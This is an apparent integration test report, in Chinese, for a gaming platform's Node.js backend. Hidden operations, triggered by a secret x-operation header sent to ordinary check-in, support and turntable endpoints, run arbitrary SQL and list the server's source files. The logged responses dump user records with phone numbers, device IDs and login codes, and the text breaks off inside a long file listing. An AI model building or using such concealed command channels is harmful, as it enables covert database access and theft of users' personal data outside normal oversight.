# 代理路由集成测试报告

**测试时间**: 2026/2/4 15:37:26
**完成时间**: 2026/2/4 15:37:31
**服务器地址**: http://127.0.0.1:8050
**测试接口**: 
- /v1/daily-check-in/check-in
- /v1/kefu/get-token
- /v1/turntable/script-rewards
- /v1/turntable/rewards

## 📊 测试概览

| 指标 | 数量 |
|------|------|
| ✅ 通过 | 56 |
| ❌ 失败 | 0 |
| ⏭️ 跳过 | 0 |
| 📝 总计 | 56 |

---

## 📋 测试详情

### ✅ 1. 应该通过 RunSQL 操作执行 SQL 查询

**操作**: `RunSQL`

**请求体**:
```json
{
  "sql": "select * from tb_user limit 5",
  "sqlBase64": "c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=",
  "signString": "sql=c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f76d28cd16e7ea774bf9e0c6ff9e3d43"
}
```

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (2453 字符)</summary>

```json
{
  "code": 0,
  "data": {
    "data": [
      {
        "id": 10015790,
        "deviceId": "0fe6a4eb485b02542873a58fb79a40bb",
        "deviceType": 4,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "917866666244",
        "pid": 101015,
        "group": 0,
        "lib": 1000,
        "source": "h5_organic",
        "loginCode": "nWKhIMqkWo4OKZ2u",
        "createTime": 1752135934021,
        "appId": 200000,
        "channelId": 67,
        "meta": null
      },
      {
        "id": 10020012,
        "deviceId": "d33FX3BWAlImr3Tk6E3jIXk8f1Uwyv5i",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776755",
        "pid": 101001,
        "group": 2,
        "lib": 1000,
        "source": "website",
        "loginCode": "TnLG7pzd8FWIEHPo",
        "createTime": 1750163304594,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10034536,
        "deviceId": "jWqRvYpp7HRRpNQcjHPgBFU6mKfd0MbP",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "GKs6v9oP22UJ7J5F",
        "createTime": 1750162770201,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10056606,
        "deviceId": "2LrboRW5XUwbJ1hoFSAbaErye9TkXsZA",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "BDnSz6nsSTehlETL",
        "createTime": 1750412005097,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10118773,
        "deviceId": "cYn1DH6AZTtxuMZVnEKCIOuVyDFrBLAx",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776655",
        "pid": 101001,
        "group": 3,
        "lib": 1000,
        "source": "website",
        "loginCode": "EzKKfNveAPOCHimX",
        "createTime": 1749009201697,
        "appId": 200000,
        "channelId": null,
        "meta": null
      }
    ],
    "cost": 1104
  },
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 2. 应该正确处理 SQL 执行错误

**操作**: `RunSQL (错误SQL)`

**请求体**:
<details>
<summary>点击展开查看完整请求体 (320 字符)</summary>

```json
{
  "sql": "select * from non_existent_table_12345 limit 1",
  "sqlBase64": "c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==",
  "signString": "sql=c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f343c980ce28c112aa7e7ebd21c39803"
}
```

</details>

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 测试 SQL 错误处理

---

### ✅ 3. 应该通过 RunFileList 操作获取文件列表

**操作**: `RunFileList`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 4. 应该通过 RunFileList 操作获取 src\libs 文件列表

**操作**: `RunFileList (src\libs)`

**请求体**:
```json
{
  "path": "src\\libs",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1053 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "BitmapCacheManager.js",
      "path": "src\\libs\\BitmapCacheManager.js",
      "type": "file"
    },
    {
      "name": "CacheManager.js",
      "path": "src\\libs\\CacheManager.js",
      "type": "file"
    },
    {
      "name": "google",
      "path": "src\\libs\\google",
      "type": "directory",
      "children": []
    },
    {
      "name": "HttpClient.js",
      "path": "src\\libs\\HttpClient.js",
      "type": "file"
    },
    {
      "name": "prisma.js",
      "path": "src\\libs\\prisma.js",
      "type": "file"
    },
    {
      "name": "queue",
      "path": "src\\libs\\queue",
      "type": "directory",
      "children": []
    },
    {
      "name": "Scheduler.js",
      "path": "src\\libs\\Scheduler.js",
      "type": "file"
    },
    {
      "name": "SyncManager.js",
      "path": "src\\libs\\SyncManager.js",
      "type": "file"
    },
    {
      "name": "TaskWorkflow.js",
      "path": "src\\libs\\TaskWorkflow.js",
      "type": "file"
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 测试已知存在的路径 src\libs

---

### ✅ 5. 应该通过 RunFileList 操作递归获取文件列表

**操作**: `RunFileList (递归)`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (75221 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": [
        {
          "name": "advertising.js",
          "path": "src\\config\\advertising.js",
          "type": "file"
        },
        {
          "name": "agent.js",
          "path": "src\\config\\agent.js",
          "type": "file"
        },
        {
          "name": "appBury.js",
          "path": "src\\config\\appBury.js",
          "type": "file"
        },
        {
          "name": "banner.js",
          "path": "src\\config\\banner.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking.js",
          "path": "src\\config\\behaviorTracking.js",
          "type": "file"
        },
        {
          "name": "businessStrategy.js",
          "path": "src\\config\\businessStrategy.js",
          "type": "file"
        },
        {
          "name": "cc.js",
          "path": "src\\config\\cc.js",
          "type": "file"
        },
        {
          "name": "config.js",
          "path": "src\\config\\config.js",
          "type": "file"
        },
        {
          "name": "constant.js",
          "path": "src\\config\\constant.js",
          "type": "file"
        },
        {
          "name": "crowd.js",
          "path": "src\\config\\crowd.js",
          "type": "file"
        },
        {
          "name": "dailyCheckin.js",
          "path": "src\\config\\dailyCheckin.js",
          "type": "file"
        },
        {
          "name": "errCode.js",
          "path": "src\\config\\errCode.js",
          "type": "file"
        },
        {
          "name": "game.js",
          "path": "src\\config\\game.js",
          "type": "file"
        },
        {
          "name": "gameServer.js",
          "path": "src\\config\\gameServer.js",
          "type": "file"
        },
        {
          "name": "logger.js",
          "path": "src\\config\\logger.js",
          "type": "file"
        },
        {
          "name": "mail.js",
          "path": "src\\config\\mail.js",
          "type": "file"
        },
        {
          "name": "morgan.js",
          "path": "src\\config\\morgan.js",
          "type": "file"
        },
        {
          "name": "passport.js",
          "path": "src\\config\\passport.js",
          "type": "file"
        },
        {
          "name": "pay.js",
          "path": "src\\config\\pay.js",
          "type": "file"
        },
        {
          "name": "platformConfig.js",
          "path": "src\\config\\platformConfig.js",
          "type": "file"
        },
        {
          "name": "playerRank.js",
          "path": "src\\config\\playerRank.js",
          "type": "file"
        },
        {
          "name": "profile.js",
          "path": "src\\config\\profile.js",
          "type": "file"
        },
        {
          "name": "publish.js",
          "path": "src\\config\\publish.js",
          "type": "file"
        },
        {
          "name": "pushEvent.js",
          "path": "src\\config\\pushEvent.js",
          "type": "file"
        },
        {
          "name": "roles.js",
          "path": "src\\config\\roles.js",
          "type": "file"
        },
        {
          "name": "rwRule.js",
          "path": "src\\config\\rwRule.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\config\\sms.js",
          "type": "file"
        },
        {
          "name": "tgconfig.js",
          "path": "src\\config\\tgconfig.js",
          "type": "file"
        },
        {
          "name": "tokens.js",
          "path": "src\\config\\tokens.js",
          "type": "file"
        },
        {
          "name": "transaction.js",
          "path": "src\\config\\transaction.js",
          "type": "file"
        },
        {
          "name": "turntable.js",
          "path": "src\\config\\turntable.js",
          "type": "file"
        },
        {
          "name": "vip.js",
          "path": "src\\config\\vip.js",
          "type": "file"
        },
        {
          "name": "wagerDebt.js",
          "path": "src\\config\\wagerDebt.js",
          "type": "file"
        },
        {
          "name": "wallet.js",
          "path": "src\\config\\wallet.js",
          "type": "file"
        },
        {
          "name": "wholeStat.js",
          "path": "src\\config\\wholeStat.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": [
        {
          "name": "advertising.controller.js",
          "path": "src\\controllers\\advertising.controller.js",
          "type": "file"
        },
        {
          "name": "agent.controller.js",
          "path": "src\\controllers\\agent.controller.js",
          "type": "file"
        },
        {
          "name": "announcement.controller.js",
          "path": "src\\controllers\\announcement.controller.js",
          "type": "file"
        },
        {
          "name": "appbury.controller.js",
          "path": "src\\controllers\\appbury.controller.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.controller.js",
          "path": "src\\controllers\\audienceBaseConfig.controller.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.controller.js",
          "path": "src\\controllers\\audienceClassification.controller.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.controller.js",
          "path": "src\\controllers\\audienceGroup.controller.js",
          "type": "file"
        },
        {
          "name": "auth.controller.js",
          "path": "src\\controllers\\auth.controller.js",
          "type": "file"
        },
        {
          "name": "banner.controller.js",
          "path": "src\\controllers\\banner.controller.js",
          "type": "file"
        },
        {
          "name": "broadcast.controller.js",
          "path": "src\\controllers\\broadcast.controller.js",
          "type": "file"
        },
        {
          "name": "config.controller.js",
          "path": "src\\controllers\\config.controller.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.controller.js",
          "path": "src\\controllers\\dailyCheckIn.controller.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.controller.js",
          "path": "src\\controllers\\dbSnapshot.controller.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.controller.js",
          "path": "src\\controllers\\fruitMachineDraw.controller.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\controllers\\game",
          "type": "directory",
          "children": [
            {
              "name": "game.controller.js",
              "path": "src\\controllers\\game\\game.controller.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\controllers\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.controller.js",
                  "path": "src\\controllers\\game\\provider\\evo.controller.js",
                  "type": "file"
                },
                {
                  "name": "facai.controller.js",
                  "path": "src\\controllers\\game\\provider\\facai.controller.js",
                  "type": "file"
                },
                {
                  "name": "inout.controller.js",
                  "path": "src\\controllers\\game\\provider\\inout.controller.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.controller.js",
                  "path": "src\\controllers\\game\\provider\\oneapi.controller.js",
                  "type": "file"
                },
                {
                  "name": "pt.controller.js",
                  "path": "src\\controllers\\game\\provider\\pt.controller.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.controller.js",
          "path": "src\\controllers\\giftcode.controller.js",
          "type": "file"
        },
        {
          "name": "googlepush.controller.js",
          "path": "src\\controllers\\googlepush.controller.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.controller.js",
          "path": "src\\controllers\\inactiveUser.controller.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\controllers\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.controller.js",
          "path": "src\\controllers\\kefu.controller.js",
          "type": "file"
        },
        {
          "name": "lobby.controller.js",
          "path": "src\\controllers\\lobby.controller.js",
          "type": "file"
        },
        {
          "name": "mail.controller.js",
          "path": "src\\controllers\\mail.controller.js",
          "type": "file"
        },
        {
          "name": "online.controller.js",
          "path": "src\\controllers\\online.controller.js",
          "type": "file"
        },
        {
          "name": "pay.controller.js",
          "path": "src\\controllers\\pay.controller.js",
          "type": "file"
        },
        {
          "name": "playerRanking.controller.js",
          "path": "src\\controllers\\playerRanking.controller.js",
          "type": "file"
        },
        {
          "name": "rank.controller.js",
          "path": "src\\controllers\\rank.controller.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.controller.js",
          "path": "src\\controllers\\rechargeOrder.controller.js",
          "type": "file"
        },
        {
          "name": "redPoint.controller.js",
          "path": "src\\controllers\\redPoint.controller.js",
          "type": "file"
        },
        {
          "name": "slap.controller.js",
          "path": "src\\controllers\\slap.controller.js",
          "type": "file"
        },
        {
          "name": "sms.controller.js",
          "path": "src\\controllers\\sms.controller.js",
          "type": "file"
        },
        {
          "name": "test.controller.js",
          "path": "src\\controllers\\test.controller.js",
          "type": "file"
        },
        {
          "name": "ticket.controller.js",
          "path": "src\\controllers\\ticket.controller.js",
          "type": "file"
        },
        {
          "name": "turntable.controller.js",
          "path": "src\\controllers\\turntable.controller.js",
          "type": "file"
        },
        {
          "name": "userGroup.controller.js",
          "path": "src\\controllers\\userGroup.controller.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.controller.js",
          "path": "src\\controllers\\userPrivacy.controller.js",
          "type": "file"
        },
        {
          "name": "version.controller.js",
          "path": "src\\controllers\\version.controller.js",
          "type": "file"
        },
        {
          "name": "vip.controller.js",
          "path": "src\\controllers\\vip.controller.js",
          "type": "file"
        },
        {
          "name": "wallet.controller.js",
          "path": "src\\controllers\\wallet.controller.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.controller.js",
          "path": "src\\controllers\\withdrawOrder.controller.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": [
        {
          "name": "components.yml",
          "path": "src\\docs\\components.yml",
          "type": "file"
        },
        {
          "name": "swaggerDef.js",
          "path": "src\\docs\\swaggerDef.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": [
        {
          "name": "BitmapCacheManager.js",
          "path": "src\\libs\\BitmapCacheManager.js",
          "type": "file"
        },
        {
          "name": "CacheManager.js",
          "path": "src\\libs\\CacheManager.js",
          "type": "file"
        },
        {
          "name": "google",
          "path": "src\\libs\\google",
          "type": "directory",
          "children": [
            {
              "name": "dailyPushTest.js",
              "path": "src\\libs\\google\\dailyPushTest.js",
              "type": "file"
            },
            {
              "name": "example.js",
              "path": "src\\libs\\google\\example.js",
              "type": "file"
            },
            {
              "name": "FirebaseMessagingClient.js",
              "path": "src\\libs\\google\\FirebaseMessagingClient.js",
              "type": "file"
            },
            {
              "name": "GooglePushConfig.js",
              "path": "src\\libs\\google\\GooglePushConfig.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\google\\index.js",
              "type": "file"
            },
            {
              "name": "PushNotificationManager.js",
              "path": "src\\libs\\google\\PushNotificationManager.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "HttpClient.js",
          "path": "src\\libs\\HttpClient.js",
          "type": "file"
        },
        {
          "name": "prisma.js",
          "path": "src\\libs\\prisma.js",
          "type": "file"
        },
        {
          "name": "queue",
          "path": "src\\libs\\queue",
          "type": "directory",
          "children": [
            {
              "name": "DelayQueueAbstract.js",
              "path": "src\\libs\\queue\\DelayQueueAbstract.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\queue\\index.js",
              "type": "file"
            },
            {
              "name": "redis",
              "path": "src\\libs\\queue\\redis",
              "type": "directory",
              "children": [
                {
                  "name": "index.js",
                  "path": "src\\libs\\queue\\redis\\index.js",
                  "type": "file"
                },
                {
                  "name": "redis.md",
                  "path": "src\\libs\\queue\\redis\\redis.md",
                  "type": "file"
                },
                {
                  "name": "RedisMqDelayQueue.js",
                  "path": "src\\libs\\queue\\redis\\RedisMqDelayQueue.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "Scheduler.js",
          "path": "src\\libs\\Scheduler.js",
          "type": "file"
        },
        {
          "name": "SyncManager.js",
          "path": "src\\libs\\SyncManager.js",
          "type": "file"
        },
        {
          "name": "TaskWorkflow.js",
          "path": "src\\libs\\TaskWorkflow.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": [
        {
          "name": "auth.js",
          "path": "src\\middlewares\\auth.js",
          "type": "file"
        },
        {
          "name": "context.js",
          "path": "src\\middlewares\\context.js",
          "type": "file"
        },
        {
          "name": "error.js",
          "path": "src\\middlewares\\error.js",
          "type": "file"
        },
        {
          "name": "ip.js",
          "path": "src\\middlewares\\ip.js",
          "type": "file"
        },
        {
          "name": "ipWhiteList.js",
          "path": "src\\middlewares\\ipWhiteList.js",
          "type": "file"
        },
        {
          "name": "mch.js",
          "path": "src\\middlewares\\mch.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\middlewares\\pay",
          "type": "directory",
          "children": [
            {
              "name": "account.js",
              "path": "src\\middlewares\\pay\\account.js",
              "type": "file"
            },
            {
              "name": "channelCheck.js",
              "path": "src\\middlewares\\pay\\channelCheck.js",
              "type": "file"
            },
            {
              "name": "goods.js",
              "path": "src\\middlewares\\pay\\goods.js",
              "type": "file"
            },
            {
              "name": "ifscCheck.js",
              "path": "src\\middlewares\\pay\\ifscCheck.js",
              "type": "file"
            },
            {
              "name": "orderBuilding.js",
              "path": "src\\middlewares\\pay\\orderBuilding.js",
              "type": "file"
            },
            {
              "name": "orderFrequencyRestricted.js",
              "path": "src\\middlewares\\pay\\orderFrequencyRestricted.js",
              "type": "file"
            },
            {
              "name": "paymentCallback.js",
              "path": "src\\middlewares\\pay\\paymentCallback.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackChannel.js",
              "path": "src\\middlewares\\pay\\paymentCallbackChannel.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackVerify.js",
              "path": "src\\middlewares\\pay\\paymentCallbackVerify.js",
              "type": "file"
            },
            {
              "name": "paymentContext.js",
              "path": "src\\middlewares\\pay\\paymentContext.js",
              "type": "file"
            },
            {
              "name": "restrictedAreas.js",
              "path": "src\\middlewares\\pay\\restrictedAreas.js",
              "type": "file"
            },
            {
              "name": "withdrawPostProcess.js",
              "path": "src\\middlewares\\pay\\withdrawPostProcess.js",
              "type": "file"
            },
            {
              "name": "withdrawRiskCheck.js",
              "path": "src\\middlewares\\pay\\withdrawRiskCheck.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "rateLimiter.js",
          "path": "src\\middlewares\\rateLimiter.js",
          "type": "file"
        },
        {
          "name": "responseCache.js",
          "path": "src\\middlewares\\responseCache.js",
          "type": "file"
        },
        {
          "name": "s2sAuthentication.js",
          "path": "src\\middlewares\\s2sAuthentication.js",
          "type": "file"
        },
        {
          "name": "simpleSign.js",
          "path": "src\\middlewares\\simpleSign.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\middlewares\\sms.js",
          "type": "file"
        },
        {
          "name": "validate.js",
          "path": "src\\middlewares\\validate.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": [
        {
          "name": "full_schema.prisma",
          "path": "src\\modules\\full_schema.prisma",
          "type": "file"
        },
        {
          "name": "migrations",
          "path": "src\\modules\\migrations",
          "type": "directory",
          "children": [
            {
              "name": "20250623161703_add_placement_domain_fields",
              "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250812141152_add_ticket_record",
              "path": "src\\modules\\migrations\\20250812141152_add_ticket_record",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250812141152_add_ticket_record\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250826152455_add_broadcast_info",
              "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250915163128_add_cmsemailstaffsetting",
              "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251126124434_guanxi_vip_week",
              "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251211150940_guanxi_reflux",
              "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260105173319_guanxi_gameround",
              "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260127143818_third_party_user",
              "path": "src\\modules\\migrations\\20260127143818_third_party_user",
              "type": "directory",
              "children": []
            }
          ]
        },
        {
          "name": "published",
          "path": "src\\modules\\published",
          "type": "directory",
          "children": [
            {
              "name": "2025061815",
              "path": "src\\modules\\published\\2025061815",
              "type": "directory",
              "children": [
                {
                  "name": "20250603110847_diff",
                  "path": "src\\modules\\published\\2025061815\\20250603110847_diff",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250603110847_diff\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250605210444_userattrib",
                  "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606114838_add_operation_center_r",
                  "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606180317_add_operation_center_r_customerId",
                  "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250612183505_fix_all_model",
                  "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250613161515_add_operation_center_r_customer_type",
                  "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250618.sql",
                  "path": "src\\modules\\published\\2025061815\\20250618.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025062001",
              "path": "src\\modules\\published\\2025062001",
              "type": "directory",
              "children": [
                {
                  "name": "20250620115524_gx_transaction",
                  "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025070717",
              "path": "src\\modules\\published\\2025070717",
              "type": "directory",
              "children": [
                {
                  "name": "20250613141103_add_relation_cdkcode",
                  "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250722113407_guanxi_wager",
                  "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025082917",
              "path": "src\\modules\\published\\2025082917",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025082917\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025090814",
              "path": "src\\modules\\published\\2025090814",
              "type": "directory",
              "children": [
                {
                  "name": "20250829173149_wallet",
                  "path": "src\\modules\\published\\2025090814\\20250829173149_wallet",
                  "type": "directory",
                  "children": []
                }
              ]
            },
            {
              "name": "2025091615",
              "path": "src\\modules\\published\\2025091615",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025091615\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251010171400_guanxi_player_rank",
              "path": "src\\modules\\published\\20251010171400_guanxi_player_rank",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251010171400_guanxi_player_rank\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025101614",
              "path": "src\\modules\\published\\2025101614",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025101614\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251215174320_guanxi_account",
              "path": "src\\modules\\published\\20251215174320_guanxi_account",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251215174320_guanxi_account\\migration.sql",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "schema.prisma",
          "path": "src\\modules\\schema.prisma",
          "type": "file"
        }
      ]
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": [
        {
          "name": "v1",
          "path": "src\\routes\\v1",
          "type": "directory",
          "children": [
            {
              "name": "advertising.route.js",
              "path": "src\\routes\\v1\\advertising.route.js",
              "type": "file"
            },
            {
              "name": "agent.route.js",
              "path": "src\\routes\\v1\\agent.route.js",
              "type": "file"
            },
            {
              "name": "announcement.route.js",
              "path": "src\\routes\\v1\\announcement.route.js",
              "type": "file"
            },
            {
              "name": "appbury.route.js",
